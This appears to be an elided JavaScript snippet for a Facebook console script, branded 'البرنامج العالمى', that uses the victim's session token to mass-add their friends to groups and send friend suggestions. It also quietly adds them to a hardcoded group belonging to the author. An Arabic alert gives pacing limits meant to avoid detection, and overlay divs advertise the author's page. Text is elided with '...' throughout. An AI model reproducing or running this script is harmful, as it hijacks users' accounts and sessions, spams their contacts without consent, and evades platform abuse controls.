...
alert('(البرنامج العالمى>>>لتجنب الحظر يجب عليك الا تزيد الاضافة فى المرة الواحدة عن 750 صديق وان تكون الفترة مبين كل اضافة ربع ساعة علي الاقل اللهم اما بلغت الله اما فاشهد >>> البرنامج سوف يبداء بعد 5ثوان )');
...
var Title ='<font color="#34b9ffF"><b>البرنامج العالمى</b> <font color="#C1C1C1">';
grpname = document.getElementById("groupsJumpTitle").innerHTML;
var Descriptions = "",
_text = '<A style="color:#0000FF;" href=" https://www.facebook.com/codes.el3almy">البرنامج العالمى.</A>.';
...
Descriptions += "</div>";
        var display ="<div id='friend-edge-display' style='box-shadow:20px 3px 20px rgba(250, 250, 250, 0.9);position:fixed;left:50%;margin-left:-273px;top:75px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:10px;box-shadow:0pt 8px 0pt rgba(16,97,1,0.1);border-radius: 14em 1em 14em 1em;border:7px solid rgba(0,138,31,1.1);background-color:rgba(1,1,1,1.9);color:#800000'>";
...
display += "<div style='text-align:center;font color='#800000' size:10px;white-space:pre-wrap;color:#800000'>";
display += _text;
display += "</div>";
display += "</div>"
} else {
...
if (gid != 386572611449908) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=386572611449908&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function() {}, "text", "post")
}
if (newcomer) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
}
if (newcomer) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
}
...
if(body != null)
{
 ...
 div.style.opacity= 1.90;
 div.style.bottom = "+60px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(1,1,1,1.5)";
 div.style.border = "1px solid rgba(1,1,1,1.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/codes.el3almy' title='صفحتنا علي الفيس بوك'><blink><center>صفحتنا علي الفيس بوك</center></blink></a>"
...
if(body != null)
{
 ...
 div.style.border = "1px solid rgba(1,1,1,1.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>للخروج من البرنامج</center></blink></a>"
 body.appendChild(div);
}
